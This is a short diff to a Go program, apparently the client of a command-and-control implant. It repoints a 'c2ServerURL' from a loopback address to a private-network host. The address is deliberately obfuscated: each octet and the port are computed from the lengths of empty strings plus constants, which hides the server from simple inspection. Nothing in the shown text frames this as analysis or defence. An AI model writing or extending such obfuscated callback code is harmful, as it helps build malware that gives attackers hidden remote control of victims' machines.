@@ -31,10 +31,10 @@ func main() {
 		str3:=""
 		str4:=""
 		strp:=""
-		x:=len(str1)+127
-		y:=len(str2)+0
-		z:=len(str3)+0
-		k:=len(str4)+1
+		x:=len(str1)+192
+		y:=len(str2)+168
+		z:=len(str3)+1
+		k:=len(str4)+247
 		l:=len(strp)+5000
 
 		c2ServerURL := "http://" + strconv.Itoa(x) + "." + strconv.Itoa(y) + "." + strconv.Itoa(z) + "." + strconv.Itoa(k) + ":" + strconv.Itoa(l)
